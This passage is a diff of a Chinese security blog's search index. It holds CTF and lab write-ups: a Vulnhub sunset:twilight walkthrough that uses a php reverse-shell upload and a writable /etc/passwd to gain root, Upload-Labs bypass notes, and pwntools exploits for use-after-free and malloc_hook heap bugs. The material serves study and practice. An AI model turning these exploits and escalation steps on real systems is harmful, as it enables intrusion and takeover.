-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure>
-
-<p>看到php文件，以为是用php提权，结果发现并不是</p>
-<p>之前有过使用<code>exim4</code>提权的经验，所以尝试<code>exim</code>提权，结果也不是</p>
-<p>无奈偷偷看一眼参考答案，发现<code>/etc/passwd</code>居然可写。。。</p>
-<p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p>
-<p>使用<code>openssl passwd -1 -salt stderr 1234</code>生成一个密码，写入一个账户即可</p>
-<p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p>
-<p>然后切换用户，得到<code>root</code>权限</p>
-<p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p>
-<p>这次的图不是很好看（</p>
-<p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>sunset</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>file-upload</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub sunset:dawn靶机</title>
     <url>//sunset-dawn.html</url>
     <content><![CDATA[<p>vulnhub里的 sunset:dawn 靶机</p>
@@ -1423,6 +1374,55 @@
       <tags>
         <tag>exploit</tag>
         <tag>smb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub sunset:twilight靶机</title>
+    <url>//sunset-twilight.html</url>
+    <content><![CDATA[<p>Vulnhub sunset系列</p>
+<a id="more"></a>
+
+<h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul>
+<li>靶机ip: <code>192.168.6.129</code></li>
+<li>kali ip: <code>192.168.6.128</code></li>
+</ul>
+<h2 id="端口扫描结果"><a href="#端口扫描结果" class="headerlink" title="端口扫描结果"></a>端口扫描结果</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
+
+<p>大致上开启了 <code>80(http)</code> <code>2121(ftp)</code> 端口</p>
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p>
+<p>点击<code>pictures</code></p>
+<p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p>
+<p>以为是<code>sql注入</code>结果手动尝试，并且<code>sqlmap</code>也测试了，并没有注入</p>
+<p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p>
+<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>使用<code>dirb</code> 工具扫描网站目录</p>
+<p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p>
+<p>找到了这个目录，访问之后是文件上传</p>
+<p>由于没有检查文件后缀名，使用<code>burpsuite</code>抓包绕过检测，成功上传文件，一个<code>php_reverse_shell</code></p>
+<p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p>
+<p>通过目录扫描的结果可以得到文件上传的路径<code>http://192.168.6.129/gallery/original/ </code></p>
+<p>访问之后得到shell</p>
+<p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找能提权的东西，找<code>setuid</code>权限的</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure>
+
+<p>看到php文件，以为是用php提权，结果发现并不是</p>
+<p>之前有过使用<code>exim4</code>提权的经验，所以尝试<code>exim</code>提权，结果也不是</p>
+<p>无奈偷偷看一眼参考答案，发现<code>/etc/passwd</code>居然可写。。。</p>
+<p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p>
+<p>使用<code>openssl passwd -1 -salt stderr 1234</code>生成一个密码，写入一个账户即可</p>
+<p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p>
+<p>然后切换用户，得到<code>root</code>权限</p>
+<p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p>
+<p>这次的图不是很好看（</p>
+<p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>sunset</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>file-upload</tag>
       </tags>
   </entry>
   <entry>
@@ -1889,19 +1889,6 @@
       </tags>
   </entry>
   <entry>
-    <title>提升交互式shell</title>
-    <url>//upgrade_shell.html</url>
-    <content><![CDATA[<h1 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h1><p><a href="https://www.sohu.com/a/161766202_709042">https://www.sohu.com/a/161766202_709042</a></p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网基础知识</title>
     <url>//net_base_1.html</url>
     <content><![CDATA[<p><code>《内网安全攻防》</code>读书笔记</p>
@@ -2036,6 +2023,19 @@
       </tags>
   </entry>
   <entry>
+    <title>提升交互式shell</title>
+    <url>//upgrade_shell.html</url>
+    <content><![CDATA[<h1 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h1><p><a href="https://www.sohu.com/a/161766202_709042">https://www.sohu.com/a/161766202_709042</a></p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Upload-Labs 6-10</title>
     <url>//Upload-Labs02.html</url>
     <content><![CDATA[<p><code>Upload-labs</code>的记录</p>
@@ -2112,6 +2112,22 @@
 <p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201195722186.png" alt="image-20201201195722186"></p>
 <blockquote>
 <p>  注：由于docker内靶机的php版本为5.5.38，已经修复了该问题，无法复现</p>
+</blockquote>
+<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和上题是一样的，无非就是从<code>$_GET</code>变成了<code>$_POST</code></p>
+<p>在<code>burp suite</code>的<code>hex</code>部分在文件名后面增加一个<code>%00</code>即可绕过</p>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>同上题一样，由于php版本问题，无法复现</p>
+<h2 id="pass13-15"><a href="#pass13-15" class="headerlink" title="pass13-15"></a>pass13-15</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题要求上传图片马，由于绕过思路类似，所以只上传一个（</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202194401460.png" alt="image-20201202194401460"></p>
+<p>这里出问题就出在<code>getReailFileType</code>函数，这个函数只检查了文件的头两个字节，所以加上<code>GIF89a</code>（即文件头）即可绕过</p>
+<p>当然，有个更加简单的办法——直接找一张真实的图片，在文件最后，写上木马。</p>
+<p>这个方法可以直接pass13-15</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202194747675.png" alt="image-20201202194747675"></p>
+<blockquote>
+<p>  由于队内web说 18，19 不推荐做，那就太监了（</p>
 </blockquote>
 ]]></content>
       <categories>
@@ -2347,35 +2363,6 @@
       </tags>
   </entry>
   <entry>
-    <title>一个堆溢出的小例子</title>
-    <url>//an_example.html</url>
-    <content><![CDATA[<ul>
-<li>让程序中，有两个指标指向同一个chunk<ul>
-<li>一块是<strong>structure</strong>，另一块是用作<strong>data buffer</strong></li>
-<li>利用对<strong>buffer</strong>的读写，泄露或者修改<strong>structure</strong>的内容</li>
-</ul>
-</li>
-</ul>
-<a id="more"></a>
-
-<h3 id="练习程序"><a href="#练习程序" class="headerlink" title="练习程序"></a>练习程序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;class A&quot;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;class B&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1233\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pause</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//setbuf(stdin,0);</span></span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	A *p = <span class="keyword">new</span> B();</span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line">	add();</span><br><span class="line">	fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">	pause();</span><br><span class="line">	add();</span><br><span class="line">	<span class="keyword">char</span> *q = strdup(buf);</span><br><span class="line">	p-&gt;print();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><em>说明:其中的<strong>add()**函数，是我用来改变</strong>sh()<strong>的地址的,(本来是0a结尾，会被截断)，</strong>pause()**是调试的时候用来下断点的，setvbuf(stdin,0,2,0)是必须的，不然fgets会拿走fastbin</em></p>
-<p>在CPP中，new对象的时候会创建一个堆块，里面放入参数和函数的地址，这里delete p之后并没有让p指向null，所以p指针还有值，可以被调用，<code>q = srtdup(buf)</code>可以拿到q对应的堆块，<strong>改写其中的指针，使其指向buf + 8 ，然后让buf + 8指向sh()**，就可以调用</strong>sh()**函数</p>
-<p>payload如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./UAF&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;1233&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x601160</span> + <span class="number">8</span>) + p64(<span class="number">0x40091b</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>pwn</category>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>极光实验室二进制组考核</title>
     <url>//aurora_bin_test.html</url>
     <content><![CDATA[<p>极光实验室二进制组考核pwn题wp</p>
@@ -2407,6 +2394,77 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">onegadget = base + one[<span class="number">3</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(onegadget) + p64(realloc + <span class="number">0x10</span>))</span><br></pre></td></tr></table></figure>
 <p>再一次分配一个堆块就能得到shell</p>
 ]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>main函数的ROP问题</title>
+    <url>//main_rop.html</url>
+    <content><![CDATA[<p>示例：安恒7月月赛签到题</p>
+<p><strong>本文主要探讨的是main函数的ROP问题，不是题解（</strong></p>
+<a id="more"></a>
+
+
+
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>伪C代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nCan you solve this sign-in problem?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048595 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048595                 public main</span><br><span class="line">.text:08048595 main            proc near               ; DATA XREF: _start+17↑o</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 var_28          &#x3D; byte ptr -28h</span><br><span class="line">.text:08048595 s               &#x3D; byte ptr -18h</span><br><span class="line">.text:08048595 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:08048595 argc            &#x3D; dword ptr  8</span><br><span class="line">.text:08048595 argv            &#x3D; dword ptr  0Ch</span><br><span class="line">.text:08048595 envp            &#x3D; dword ptr  10h</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048599                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804859C                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804859F                 push    ebp</span><br><span class="line">.text:080485A0                 mov     ebp, esp</span><br><span class="line">.text:080485A2                 push    ecx</span><br><span class="line">.text:080485A3                 sub     esp, 24h</span><br><span class="line">.text:080485A6                 call    init</span><br><span class="line">.text:080485AB                 sub     esp, 0Ch</span><br><span class="line">.text:080485AE                 push    offset s        ; &quot;what&#39;s your name:&quot;</span><br><span class="line">.text:080485B3                 call    _puts</span><br><span class="line">.text:080485B8                 add     esp, 10h</span><br><span class="line">.text:080485BB                 sub     esp, 0Ch</span><br><span class="line">.text:080485BE                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C1                 push    eax             ; s</span><br><span class="line">.text:080485C2                 call    _gets</span><br><span class="line">.text:080485C7                 add     esp, 10h</span><br><span class="line">.text:080485CA                 sub     esp, 0Ch</span><br><span class="line">.text:080485CD                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485D0                 push    eax             ; format</span><br><span class="line">.text:080485D1                 call    _printf</span><br><span class="line">.text:080485D6                 add     esp, 10h</span><br><span class="line">.text:080485D9                 sub     esp, 0Ch</span><br><span class="line">.text:080485DC                 push    offset aCanYouSolveThi ; &quot;\nCan you solve this sign-in problem?&quot;</span><br><span class="line">.text:080485E1                 call    _puts</span><br><span class="line">.text:080485E6                 add     esp, 